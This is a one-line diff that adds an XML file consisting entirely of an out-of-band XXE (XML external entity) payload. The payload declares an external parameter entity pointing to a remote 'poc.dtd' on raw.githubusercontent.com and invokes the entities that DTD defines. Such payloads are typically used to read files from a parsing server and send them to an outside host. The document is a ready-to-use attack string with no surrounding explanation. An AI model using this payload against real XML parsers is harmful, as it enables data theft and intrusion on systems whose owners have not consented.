@@ -1,0 +1,1 @@
+<?xml version=\"1.0\" ?><!DOCTYPE a [ <!ENTITY % asd SYSTEM \"https://raw.githubusercontent.com/vinnyvinoth/xxe/main/poc.dtd\"> %asd; %c; ]><a>&rrr;</a>
